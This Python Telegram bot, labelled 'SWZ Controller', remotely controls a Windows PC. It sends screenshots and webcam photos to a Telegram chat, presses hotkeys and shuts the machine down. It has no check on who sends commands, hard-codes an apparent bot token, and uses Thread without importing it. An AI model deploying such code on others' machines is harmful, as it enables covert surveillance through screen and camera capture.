import telebot
from telebot import types # для указание типов
import webbrowser
import pyautogui
import time
import os
import cv2

bot = telebot.TeleBot('5261103493:AAEAYVSloDik9_G4wfA_FM8YhjV16Ni0JIc')

print('Launched')

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn2 = types.KeyboardButton("Screenshot")
    btn3 = types.KeyboardButton("ALT + F4")
    btn5 = types.KeyboardButton('Enter')
    btn6 = types.KeyboardButton('Открыть вкладку')
    btn7 = types.KeyboardButton('Закрыть вкладку')
    btn8 = types.KeyboardButton('Создать второй рабочий стол')
    btn9 = types.KeyboardButton('Удалить второй рабочий стол')
    btn10 = types.KeyboardButton('Курсор в угол')
    btn11 = types.KeyboardButton('Cнимок с камеры')
    btn12 = types.KeyboardButton('Вернуться на раб.стол')
    btn14 = types.KeyboardButton('Выключить ПК')

    markup.add(btn3, btn5)
    markup.add(btn6, btn7)
    markup.add(btn8, btn9)
    markup.add(btn10, btn11)
    markup.add(btn12, btn14)
    markup.add(btn2)
    bot.send_message(message.chat.id, text="SWZ Controller".format(message.from_user), reply_markup=markup)

@bot.message_handler(content_types=['text'])
def func(message):
    if(message.text == "Screenshot"):
        screen = pyautogui.screenshot('screenshot.png')
        p = open('screenshot.png', 'rb')
        bot.send_photo(message.chat.id, p)
        p.close()
        os.remove('screenshot.png')

    if(message.text == "ALT + F4"):
        pyautogui.hotkey('alt','F4')
        time.sleep(0.4)
        screen = pyautogui.screenshot('screenshot.png')
        p = open('screenshot.png', 'rb')
        bot.send_photo(message.chat.id, p)
        p.close()
        os.remove('screenshot.png')
        print(screen)

    if(message.text == "Enter"):
        pyautogui.hotkey('enter')

    if(message.text == "Открыть вкладку"):
        webbrowser.open('https://www.google.com', new=2)

    if(message.text == "Закрыть вкладку"):
        pyautogui.hotkey('ctrl', 'w')

    if(message.text == 'Создать второй рабочий стол'):
        pyautogui.hotkey('win', 'ctrl', 'd')

    if(message.text == 'Удалить второй рабочий стол'):
        pyautogui.hotkey('win', 'ctrl', 'F4')

    if(message.text == 'Курсор в угол'):
        pyautogui.moveTo(1, 1)

    if(message.text == 'Cнимок с камеры'):
        bot.send_message(message.chat.id, 'Делаем снимок...')
        cap = cv2.VideoCapture(0)
        for i in range(10):
            cap.read()

        ret, frame = cap.read()
        cv2.imwrite('cam.png', frame)
        cap.release()

        c = open('cam.png', 'rb')
        bot.send_photo(message.chat.id, c)
        c.close()
        os.remove('cam.png')

    if(message.text == 'Вернуться на раб.стол'):
        pyautogui.hotkey('win', 'd')

    if(message.text == 'Выключить ПК'):
        bot.send_message(message.chat.id, "Выключение пк")
        pyautogui.hotkey('win', 'd')
        t = Thread(target=print, args=[1])
        t.run()
        pyautogui.hotkey('alt', 'F4')
        d = Thread(target=print, args=[1])
        d.run()
        pyautogui.hotkey('enter')


bot.polling(none_stop=True)
